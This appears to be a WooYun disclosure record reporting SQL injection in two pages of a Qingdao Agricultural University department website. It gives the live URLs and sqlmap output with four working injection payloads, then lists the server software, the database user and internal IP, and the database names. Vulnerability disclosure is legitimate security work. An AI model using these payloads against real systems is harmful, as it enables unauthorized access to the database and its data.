wybug_title: 青岛农业大学社科处SQL注入(附带两处)
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-14：	细节已通知厂商并且等待厂商处理中									2015-01-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL 详细说明：  SQL注入   漏洞证明：  注入点:http://skc.qau.edu.cn/subpage.php?cat_id=1http://skc.qau.edu.cn/subpage_detail.php?id=221sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: cat_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cat_id=1' AND 2309=2309 AND 'OjgG'='OjgG    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: cat_id=1' AND (SELECT 4311 FROM(SELECT COUNT(*),CONCAT(0x7163767171,(SELECT (CASE WHEN (4311=4311) THEN 1 ELSE 0 END)),0x7176626571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'yQVG'='yQVG    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: cat_id=-1655' UNION ALL SELECT CONCAT(0x7163767171,0x4e427a4454564f796943,0x7176626571)#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: cat_id=1' AND SLEEP(5) AND 'fGkj'='fGkj---[16:22:11] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0[16:22:11] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\skc.qau.edu.cn'[*] shutting down at 16:22:11current user:    'skc@210.44.48.34'current database:    'skcDB'available databases [3]:[*] information_schema[*] skcDB[*] test   修复方案：  过滤！   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-19 14:30 厂商回复：  最新状态： 暂无
